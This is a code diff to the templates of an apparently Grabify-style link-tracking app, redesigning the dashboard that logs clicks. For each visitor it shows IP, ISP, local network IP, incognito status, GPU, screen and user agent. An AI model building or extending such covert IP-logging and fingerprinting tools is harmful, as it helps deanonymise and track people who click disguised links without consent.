@@ -277,7 +277,7 @@ MY_LINKS_LAYOUT = '''
                         <td><a href="/secure/{{ link.id }}" target="_blank">secure/{{ link.id }}</a></td>
                         <td>
                             <a href="/analytics/{{ link.id }}" class="btn-action btn-view">📊 Advanced Logs</a>
-                            <a href="/delete/{{ link.id }}" class="btn-action btn-del" onclick="return confirm('Delete?');">🗑️</a>
+                            <a href="/delete/language/{{ link.id }}" class="btn-action btn-del" onclick="return confirm('Delete?');">🗑️</a>
                         </td>
                     </tr>
                     {% endfor %}
@@ -295,31 +295,44 @@ ANALYTICS_LAYOUT = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Grabify-Style Advanced Log Control</title>
+    <title>Grabify-Style Premium Analytics</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f6f9; margin: 0; padding: 0; }
-        .navbar { background-color: #0f172a; color: white; padding: 15px; display: flex; justify-content: space-between; }
-        .navbar a { color: white; text-decoration: none; background: #475569; padding: 8px 12px; border-radius: 4px; }
-        .container { max-width: 1100px; margin: 30px auto; padding: 10px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background-color: #f4f6f9; margin: 0; padding: 0; color: #333; }
+        .navbar { background-color: #0f172a; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
+        .navbar a { color: white; text-decoration: none; background: #475569; padding: 8px 12px; border-radius: 4px; font-size: 13px; font-weight: bold; }
+        .container { max-width: 1200px; margin: 30px auto; padding: 0 15px; box-sizing: border-box; }
+        h2 { font-size: 22px; color: #1e293b; margin-bottom: 20px; }
         
-        .grabify-table { width: 100%; background: white; border-collapse: collapse; border-radius: 6px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #d1d5db; font-size: 13px; }
+        .table-responsive { width: 100%; background: white; border-radius: 6px; overflow-x: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #d1d5db; }
+        .grabify-table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 800px; table-layout: fixed; }
         .grabify-table th { background: #2c3e50; color: white; padding: 12px; text-align: left; font-weight: bold; }
-        .grabify-table td { padding: 12px; border-bottom: 1px solid #e5e7eb; vertical-align: middle; }
+        .grabify-table td { padding: 12px; border-bottom: 1px solid #e5e7eb; white-space: nowrap; text-overflow: ellipsis; overflow: hidden; }
         .grabify-table tr:nth-child(even) { background: #f9fafb; }
-        
         .bot-row { background: #fff7ed !important; }
-        .badge-danger { background-color: #ef4444; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; font-size: 12px; }
-        .badge-bot { background: #ea580c; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; font-size: 11px; }
-        .badge-user { background: #2563eb; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; font-size: 11px; }
         
-        /* تنسيق زر More Info الصغير المقارب لـ Grabify */
-        .btn-more { background-color: #0088cc; color: white; border: none; padding: 5px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .badge-danger { background-color: #ef4444; color: white; padding: 3px 8px; border-radius: 4px; font-weight: bold; font-size: 12px; display: inline-block; }
+        .badge-bot { background: #ea580c; color: white; padding: 3px 8px; border-radius: 4px; font-weight: bold; font-size: 11px; display: inline-block; }
+        .badge-user { background: #2563eb; color: white; padding: 3px 8px; border-radius: 4px; font-weight: bold; font-size: 11px; display: inline-block; }
+        
+        .btn-more { background-color: #0088cc; color: white; border: none; padding: 6px 12px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; }
         .btn-more:hover { background-color: #006699; }
+
+        /* تكتيك المنبثقة الذكية المطابقة لـ Grabify Modal */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
+        .modal-content { background: white; width: 100%; max-width: 550px; border-radius: 8px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.25); animation: fadeIn 0.3s ease-out; }
+        .modal-header { background: #f8fafc; padding: 15px; font-weight: bold; font-size: 16px; border-bottom: 1px solid #e2e8f0; display: flex; justify-content: space-between; align-items: center; color: #0f172a; }
+        .modal-close { background: none; border: none; font-size: 20px; cursor: pointer; color: #94a3b8; font-weight: bold; }
+        .modal-body { padding: 0; max-height: 80vh; overflow-y: auto; }
         
-        /* حاوية التفاصيل المنسدلة المخفية */
-        .hidden-details { display: none; background: #f8fafc; border: 1px solid #cbd5e1; padding: 15px; margin-top: 10px; border-radius: 6px; text-align: left; width: 95%; box-sizing: border-box; }
-        .details-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 12px; line-height: 1.5; color: #334155; }
-        .ua-block { grid-column: span 2; background: #ede9fe; padding: 8px; border-radius: 4px; font-family: monospace; font-size: 11px; color: #5b21b6; word-break: break-all; }
+        /* جدول البيانات المنبثقة العمودي */
+        .modal-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: left; }
+        .modal-table tr { border-bottom: 1px solid #f1f5f9; }
+        .modal-table tr:last-child { border-bottom: none; }
+        .modal-table td { padding: 12px 16px; vertical-align: top; }
+        .modal-table td:first-child { font-weight: bold; color: #475569; width: 40%; background-color: #f8fafc; }
+        .modal-table td:last-child { color: #0f172a; word-break: break-all; white-space: normal; }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
     </style>
 </head>
 <body>
@@ -330,77 +343,125 @@ ANALYTICS_LAYOUT = '''
     <div class="container">
         <h2>Results & Link Information Log</h2>
         
-        <table class="grabify-table">
-            <thead>
-                <tr>
-                    <th>Date/Time</th>
-                    <th>IP / Provider</th>
-                    <th>Platform / Device</th>
-                    <th>Referring URL</th>
-                    <th>More Details</th>
-                </tr>
-            </thead>
-            <tbody>
-                {% if not clicks_list %}
-                <tr><td colspan="5" style="text-align:center; color:#9ca3af; padding:30px;">No logs recorded yet. Awaiting interactions...</td></tr>
-                {% endif %}
-                
-                {% for click in clicks_list %}
-                <tr class="{% if 'Bot' in click.device_model or 'Crawler' in click.device_model %}bot-row{% endif %}">
-                    <td><strong>{{ click.time }}</strong><br><small style="color:#64748b;">Algerian Time</small></td>
-                    <td>
-                        <span class="badge-danger">{{ click.ip }}</span><br>
-                        <small style="font-weight:bold; color:#4b5563;">
-                            {% if "Facebook" in click.device_model %}FACEBOOK, INC.
-                            {% elif "Telegram" in click.device_model %}TELEGRAM MESSENGER LLP
-                            {% elif "WhatsApp" in click.device_model %}WHATSAPP INC.
-                            {% else %}ISP CLIENT NETWORK
+        <div class="table-responsive">
+            <table class="grabify-table">
+                <colgroup>
+                    <col style="width: 20%;">
+                    <col style="width: 25%;">
+                    <col style="width: 25%;">
+                    <col style="width: 18%;">
+                    <col style="width: 12%;">
+                </colgroup>
+                <thead>
+                    <tr>
+                        <th>Date/Time</th>
+                        <th>IP / Provider</th>
+                        <th>Platform / Device</th>
+                        <th>Referring URL</th>
+                        <th>More Info</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% if not clicks_list %}
+                    <tr><td colspan="5" style="text-align:center; color:#9ca3af; padding:30px;">No logs recorded yet. Awaiting interactions...</td></tr>
+                    {% endif %}
+                    
+                    {% for click in clicks_list %}
+                    <tr class="{% if 'Bot' in click.device_model or 'Crawler' in click.device_model %}bot-row{% endif %}">
+                        <td><strong>{{ click.time }}</strong></td>
+                        <td>
+                            <span class="badge-danger">{{ click.ip }}</span><br>
+                            <small style="font-weight:bold; color:#4b5563;">
+                                {% if "Facebook" in click.device_model %}FACEBOOK, INC.
+                                {% elif "Telegram" in click.device_model %}TELEGRAM MESSENGER LLP
+                                {% elif "WhatsApp" in click.device_model %}WHATSAPP INC.
+                                {% else %}ISP CLIENT NETWORK
+                                {% endif %}
+                            </small>
+                        </td>
+                        <td>
+                            {% if "Bot" in click.device_model or "Crawler" in click.device_model %}
+                            <span class="badge-bot">🤖 {{ click.device_model }}</span>
+                            {% else %}
+                            <span class="badge-user">📱 {{ click.device_model }}</span>
                             {% endif %}
-                        </small>
-                    </td>
-                    <td>
-                        {% if "Bot" in click.device_model or "Crawler" in click.device_model %}
-                        <span class="badge-bot">🤖 {{ click.device_model }}</span>
-                        {% else %}
-                        <span class="badge-user">📱 {{ click.device_model }}</span>
-                        {% endif %}
-                    </td>
-                    <td style="color:#2563eb; word-break:break-all; font-size:12px;">{{ click.referrer }}</td>
-                    <td>
-                        <button class="btn-more" onclick="toggleDetails('details-{{ click.id }}')">More Info</button>
-                        
-                        <div id="details-{{ click.id }}" class="hidden-details">
-                            <div class="details-grid">
-                                <div><strong>Local Network IP:</strong> <span style="color:#16a34a; font-weight:bold;">{{ click.local_ip }}</span></div>
-                                <div><strong>Incognito Browser Check:</strong> {{ click.incognito }}</div>
-                                <div><strong>Screen Canvas Size:</strong> {{ click.screen_size }}</div>
-                                <div><strong>Hardware GPU Engine:</strong> {{ click.gpu }}</div>
-                                <div><strong>Browser Languages:</strong> {{ click.language }}</div>
-                                <div><strong>Touch Points:</strong> {{ click.touch_points }}</div>
-                                <div class="ua-block">
-                                    <strong>Raw User Agent:</strong><br>{{ click.device }}
-                                </div>
-                            </div>
-                        </div>
-                    </td>
-                </tr>
-                {% endfor %}
-            </tbody>
-        </table>
+                        </td>
+                        <td style="color:#2563eb;">{{ click.referrer }}</td>
+                        <td>
+                            <button class="btn-more" onclick="openModal({{ loop.index0 }})">More Info</button>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <div id="grabifyModal" class="modal-overlay" onclick="closeModal(event)">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <span>Advanced Log</span>
+                <button class="modal-close" onclick="closeModal(true)">&times;</button>
+            </div>
+            <div class="modal-body">
+                <table class="modal-table">
+                    <tr><td>Date/Time</td><td id="m_time"></td></tr>
+                    <tr><td>IP Address</td><td id="m_ip" style="color: #ef4444; font-weight: bold;"></td></tr>
+                    <tr><td>Platform / Client</td><td id="m_client"></td></tr>
+                    <tr><td>Local Network IP</td><td id="m_local_ip" style="color: #16a34a; font-weight: bold;"></td></tr>
+                    <tr><td>Incognito Window</td><td id="m_incognito"></td></tr>
+                    <tr><td>Screen Canvas Size</td><td id="m_screen"></td></tr>
+                    <tr><td>Hardware GPU Engine</td><td id="m_gpu"></td></tr>
+                    <tr><td>Browser Languages</td><td id="m_lang"></td></tr>
+                    <tr><td>Touch Screen</td><td id="m_touch"></td></tr>
+                    <tr><td>Referring URL</td><td id="m_referrer" style="color: #2563eb;"></td></tr>
+                    <tr><td>Raw User Agent</td><td id="m_ua" style="font-family: monospace; font-size: 11px; color:#5b21b6; background: #f8fafc;"></td></tr>
+                </table>
+            </div>
+        </div>
     </div>
 
     <script>
-        function toggleDetails(id) {
-            var box = document.getElementById(id);
-            if (box.style.display === "block") {
-                box.style.display = "none";
-            } else {
-                // إغلاق أي صناديق أخرى مفتوحة للحفاظ على التنسيق
-                var allBoxes = document.querySelectorAll('.hidden-details');
-                allBoxes.forEach(function(b) { b.style.display = "none"; });
-                
-                box.style.display = "block";
-            }
+        // تخزين كافة السجلات في مصفوفة جافا سكريبت محلياً للسرعة القصوى عند الفتح وضمان ثبات التناسق
+        var logsData = [
+            {% for click in clicks_list %}
+            {
+                time: "{{ click.time }}",
+                ip: "{{ click.ip }}",
+                model: "{{ click.device_model }}",
+                local_ip: "{{ click.local_ip }}",
+                incognito: "{{ click.incognito }}",
+                screen: "{{ click.screen_size }}",
+                gpu: "{{ click.gpu }}",
+                lang: "{{ click.language }}",
+                touch: "{{ click.touch_points }}",
+                referrer: "{{ click.referrer }}",
+                ua: "{{ click.device | replace('"', '\\"') }}"
+            }{% if not loop.last %},{% endif %}
+            {% endfor %}
+        ];
+
+        function openModal(index) {
+            var data = logsData[index];
+            if(!data) return;
+            
+            document.getElementById('m_time').innerText = data.time;
+            document.getElementById('m_ip').innerText = data.ip;
+            document.getElementById('m_client').innerText = data.model;
+            document.getElementById('m_local_ip').innerText = data.local_ip;
+            document.getElementById('m_incognito').innerText = data.incognito;
+            document.getElementById('m_screen').innerText = data.screen;
+            document.getElementById('m_gpu').innerText = data.gpu;
+            document.getElementById('m_lang').innerText = data.lang;
+            document.getElementById('m_touch').innerText = data.touch;
+            document.getElementById('m_referrer').innerText = data.referrer;
+            document.getElementById('m_ua').innerText = data.ua;
+            
+            document.getElementById('grabifyModal').style.display = 'flex';
+        }
+
+        function closeModal(force) {
+            document.getElementById('grabifyModal').style.display = 'none';
         }
     </script>
 </body>
